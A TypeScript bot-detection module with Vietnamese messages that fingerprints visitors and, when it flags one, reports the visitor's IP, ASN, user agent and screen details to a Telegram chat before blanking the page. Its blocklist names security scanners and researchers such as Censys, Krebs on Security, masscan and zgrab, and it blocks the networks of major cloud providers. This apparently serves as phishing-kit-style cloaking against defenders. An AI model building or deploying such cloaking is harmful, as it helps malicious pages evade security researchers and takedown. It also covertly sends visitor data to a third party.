import axios from "axios";
import getConfig from "./config";
import type {
  BotDetectionResult,
  BlockedCheckResult,
  GeoData,
  DeviceFingerprint,
  BotDetectorConfig,
} from "../types/bot";

const BOT_CONFIG: BotDetectorConfig = {
  blockedKeywords: [
    "bot",
    "crawler",
    "spider",
    "puppeteer",
    "selenium",
    "http",
    "client",
    "curl",
    "wget",
    "python",
    "java",
    "ruby",
    "go",
    "scrapy",
    "lighthouse",
    "censysinspect",
    "facebookexternalhit",
    "krebsonsecurity",
    "ivre-masscan",
    "ahrefs",
    "semrush",
    "sistrix",
    "mailchimp",
    "mailgun",
    "larbin",
    "libwww",
    "spinn3r",
    "zgrab",
    "masscan",
    "yandex",
    "baidu",
    "sogou",
    "tweetmeme",
    "misting",
    "BotPoke",
  ],

  blockedASNs: [
    15169, 32934, 396982, 8075, 16510, 198605, 45102, 201814, 14061, 214961,
    401115, 135377, 60068, 55720, 397373, 208312, 63949, 210644, 6939, 209,
    51396, 147049,
  ],

  blockedIPs: ["95.214.55.43", "154.213.184.3"],

  obviousBotKeywords: ["googlebot", "bingbot", "crawler", "spider"],

  seleniumProps: [
    "__selenium_unwrapped",
    "__webdriver_evaluate",
    "__driver_evaluate",
    "__webdriver_script_function",
    "__webdriver_script_func",
    "__webdriver_script_fn",
    "__fxdriver_evaluate",
    "__driver_unwrapped",
    "__webdriver_unwrapped",
    "__selenium_evaluate",
    "__fxdriver_unwrapped",
  ],
};

const sendBotTelegram = async (reason: string): Promise<void> => {
  try {
    const config = getConfig();
    const geoUrl = "https://get.geojs.io/v1/ip/geo.json";
    const botToken = config.telegram.noti_token;
    const chatId = config.telegram.noti_chat_id;

    const geoRes = await axios.get<GeoData>(geoUrl);
    const geoData = geoRes.data;

    const fullFingerprint: DeviceFingerprint = {
      asn: geoData.asn,
      organization_name: geoData.organization_name,
      organization: geoData.organization,
      ip: geoData.ip,
      navigator: {
        userAgent: navigator.userAgent,
        hardwareConcurrency: navigator.hardwareConcurrency,
        maxTouchPoints: navigator.maxTouchPoints,
        webdriver: navigator.webdriver,
      },
      screen: {
        width: screen.width,
        height: screen.height,
        availWidth: screen.availWidth,
        availHeight: screen.availHeight,
      },
    };

    const msg = `🚫 <b>BOT BỊ CHẶN</b>
🔍 <b>Lý do:</b> <code>${reason}</code>

📍 <b>IP:</b> <code>${fullFingerprint.ip}</code>
🏢 <b>ASN:</b> <code>${fullFingerprint.asn}</code>
🏛️ <b>Nhà mạng:</b> <code>${fullFingerprint.organization_name ?? fullFingerprint.organization ?? "Không rõ"}</code>

🌐 <b>Trình duyệt:</b> <code>${fullFingerprint.navigator.userAgent}</code>
💻 <b>CPU:</b> <code>${fullFingerprint.navigator.hardwareConcurrency}</code> nhân
📱 <b>Touch:</b> <code>${fullFingerprint.navigator.maxTouchPoints}</code> điểm
🤖 <b>WebDriver:</b> <code>${fullFingerprint.navigator.webdriver ? "Có" : "Không"}</code>

📺 <b>Màn hình:</b> <code>${fullFingerprint.screen.width}x${fullFingerprint.screen.height}</code>
📐 <b>Màn hình thực:</b> <code>${fullFingerprint.screen.availWidth}x${fullFingerprint.screen.availHeight}</code>`;

    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const payload = {
      chat_id: chatId,
      text: msg,
      parse_mode: "HTML",
    };

    await axios.post(telegramUrl, payload, {
      headers: { "Content-Type": "application/json" },
    });
  } catch (error) {
    console.warn("Không thể gửi thông báo Telegram:", error);
  }
};

const blockBot = async (reason: string): Promise<void> => {
  await sendBotTelegram(reason);
  document.body.innerHTML = "";
  try {
    window.location.href = "about:blank";
  } catch (error) {
    console.warn("Không thể chuyển hướng:", error);
  }
};

const checkUserAgentKeywords = async (): Promise<BlockedCheckResult> => {
  const userAgent = navigator.userAgent.toLowerCase();
  const blockedKeyword = BOT_CONFIG.blockedKeywords.find((keyword) =>
    userAgent.includes(keyword.toLowerCase()),
  );

  if (blockedKeyword) {
    const reason = `User agent chứa keyword: ${blockedKeyword}`;
    await blockBot(reason);
    return { isBlocked: true, reason };
  }

  return { isBlocked: false };
};

const checkGeoIPBlocking = async (): Promise<BlockedCheckResult> => {
  try {
    const ipInfo = localStorage.getItem("ipInfo");
    if (!ipInfo) {
      return { isBlocked: false };
    }

    const data: GeoData = JSON.parse(ipInfo);

    if (BOT_CONFIG.blockedASNs.includes(Number(data.asn))) {
      const reason = `ASN bị chặn: ${data.asn}`;
      await blockBot(reason);
      return { isBlocked: true, reason };
    }

    if (BOT_CONFIG.blockedIPs.includes(data.ip)) {
      const reason = `IP bị chặn: ${data.ip}`;
      await blockBot(reason);
      return { isBlocked: true, reason };
    }

    return { isBlocked: false };
  } catch (error) {
    console.warn("Lỗi khi kiểm tra GeoIP:", error);
    return { isBlocked: false };
  }
};

const checkWebDriverDetection = async (): Promise<BotDetectionResult> => {
  if (navigator.webdriver === true) {
    const reason = "navigator.webdriver = true";
    await blockBot(reason);
    return { isBot: true, reason };
  }

  if ("__nightmare" in window) {
    const reason = "Nightmare.js detected";
    await blockBot(reason);
    return { isBot: true, reason };
  }

  if ("_phantom" in window || "callPhantom" in window) {
    const reason = "PhantomJS detected";
    await blockBot(reason);
    return { isBot: true, reason };
  }

  if ("Buffer" in window) {
    const reason = "Node.js Buffer detected";
    await blockBot(reason);
    return { isBot: true, reason };
  }

  if ("emit" in window) {
    const reason = "Node.js emit detected";
    await blockBot(reason);
    return { isBot: true, reason };
  }

  if ("spawn" in window) {
    const reason = "Node.js spawn detected";
    await blockBot(reason);
    return { isBot: true, reason };
  }

  const foundProp = BOT_CONFIG.seleniumProps.find((prop) => prop in window);
  if (foundProp) {
    const reason = `Selenium property detected: ${foundProp}`;
    await blockBot(reason);
    return { isBot: true, reason };
  }

  const documentProps = [
    "__webdriver_evaluate",
    "__selenium_evaluate",
    "__webdriver_script_function",
  ];
  const foundDocProp = documentProps.find((prop) => prop in document);
  if (foundDocProp) {
    const reason = `Selenium document property detected: ${foundDocProp}`;
    await blockBot(reason);
    return { isBot: true, reason };
  }

  return { isBot: false };
};

const checkNavigatorAnomalies = async (): Promise<BotDetectionResult> => {
  if (navigator.hardwareConcurrency) {
    if (navigator.hardwareConcurrency > 128) {
      const reason = `hardwareConcurrency quá cao: ${navigator.hardwareConcurrency}`;
      await blockBot(reason);
      return { isBot: true, reason };
    }

    if (navigator.hardwareConcurrency < 1) {
      const reason = `hardwareConcurrency quá thấp: ${navigator.hardwareConcurrency}`;
      await blockBot(reason);
      return { isBot: true, reason };
    }
  }

  return { isBot: false };
};

const checkScreenAnomalies = async (): Promise<BotDetectionResult> => {
  if (screen.width === 2000 && screen.height === 2000) {
    const reason = "Màn hình 2000x2000 (bot pattern)";
    await blockBot(reason);
    return { isBot: true, reason };
  }

  if (screen.width > 4000 || screen.height > 4000) {
    const reason = `Màn hình quá lớn: ${screen.width}x${screen.height}`;
    await blockBot(reason);
    return { isBot: true, reason };
  }

  if (screen.width < 200 || screen.height < 200) {
    const reason = `Màn hình quá nhỏ: ${screen.width}x${screen.height}`;
    await blockBot(reason);
    return { isBot: true, reason };
  }

  if (screen.width === screen.height && screen.width >= 1500) {
    const reason = `Màn hình vuông lớn: ${screen.width}x${screen.height}`;
    await blockBot(reason);
    return { isBot: true, reason };
  }

  return { isBot: false };
};

const checkObviousBotKeywords = (): BotDetectionResult => {
  const userAgent = navigator.userAgent.toLowerCase();
  const foundKeyword = BOT_CONFIG.obviousBotKeywords.find((keyword) =>
    userAgent.includes(keyword.toLowerCase()),
  );

  if (foundKeyword) {
    return { isBot: true, reason: `Obvious bot keyword: ${foundKeyword}` };
  }

  return { isBot: false };
};

const detectBot = async (): Promise<BotDetectionResult> => {
  try {
    const userAgentCheck = await checkUserAgentKeywords();
    if (userAgentCheck.isBlocked) {
      return { isBot: true, reason: userAgentCheck.reason };
    }

    const webDriverCheck = await checkWebDriverDetection();
    if (webDriverCheck.isBot) {
      return { isBot: true, reason: webDriverCheck.reason };
    }

    const navigatorCheck = await checkNavigatorAnomalies();
    if (navigatorCheck.isBot) {
      return { isBot: true, reason: navigatorCheck.reason };
    }

    const screenCheck = await checkScreenAnomalies();
    if (screenCheck.isBot) {
      return { isBot: true, reason: screenCheck.reason };
    }

    const geoIPCheck = await checkGeoIPBlocking();
    if (geoIPCheck.isBlocked) {
      return { isBot: true, reason: geoIPCheck.reason };
    }

    const obviousBotCheck = checkObviousBotKeywords();
    if (obviousBotCheck.isBot) {
      return obviousBotCheck;
    }

    return { isBot: false };
  } catch (error) {
    console.error("Lỗi khi detect bot:", error);
    return { isBot: false };
  }
};

const saveIPInfo = async (): Promise<void> => {
  try {
    const geoUrl = "https://get.geojs.io/v1/ip/geo.json";
    const response = await axios.get<GeoData>(geoUrl);
    localStorage.setItem("ipInfo", JSON.stringify(response.data));
  } catch (error) {
    console.warn("Không thể lấy thông tin IP:", error);
  }
};

export default detectBot;
export { saveIPInfo, BOT_CONFIG };
